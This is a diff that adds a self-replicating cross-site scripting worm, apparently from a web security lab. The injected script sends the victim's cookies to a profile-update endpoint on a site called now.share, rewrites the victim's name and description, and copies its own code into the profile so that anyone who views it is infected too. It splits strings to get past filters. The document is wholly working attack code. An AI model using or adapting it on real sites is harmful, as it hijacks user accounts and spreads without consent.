@@ -1,0 +1,16 @@
+<script id="wm">
+var follow = document.getElementsByClassName("btn btn-primary btn-sm pull-right");
+if (follow.length >= 1) {
+var Ajax=null;
+Ajax = new XMLHttpRequest();
+Ajax.open("POST", "http://now.share/update_profile", true);
+Ajax.setRequestHeader("Host","now.share");
+Ajax.setRequestHeader("Connection", "keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+var type = "application/x-www-fo";
+Ajax.setRequestHeader("Content-Type",type.concat("rm-urlencoded"));
+var content = "full_name=Alice+Smith&description=Charlie+was+here!"
+content = content.concat(escape("<script id=wm>".concat(document.getElementById("wm").innerHTML).concat("</scri").concat("pt>")));
+Ajax.send(content)
+}
+</script>
